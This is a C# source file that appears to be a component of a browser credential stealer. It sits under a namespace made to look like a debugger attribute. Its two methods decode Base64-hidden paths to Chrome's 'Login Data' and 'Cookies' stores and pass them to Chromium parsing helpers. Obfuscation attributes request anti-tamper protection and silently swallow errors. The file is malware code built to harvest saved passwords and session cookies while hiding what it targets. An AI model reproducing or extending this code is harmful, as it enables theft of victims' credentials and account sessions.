using DebuggerStepThroughAttribute.Base;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;

namespace DebuggerStepThroughAttribute
{
    public class C
    {
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<LD> GETLLD()
        {
            try
            {

                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("R29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcTG9naW4gRGF0YQ==")));

                
                return Chromium.GETLDSs(dataPath, bn.cc);
            } catch (Exception)
            {
                return new List<LD>();
            }
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<IReflectableType> GETCCD()
        {
            try
            {
                string dataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                   System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("R29vZ2xlXFxDaHJvbWVcXFVzZXIgRGF0YVxcRGVmYXVsdFxcQ29va2llcw==")));

                return Chromium.GETOPAG(dataPath, bn.cc);
            } catch (Exception)
            {
                return new List<IReflectableType>();
            }
        }
    }
}
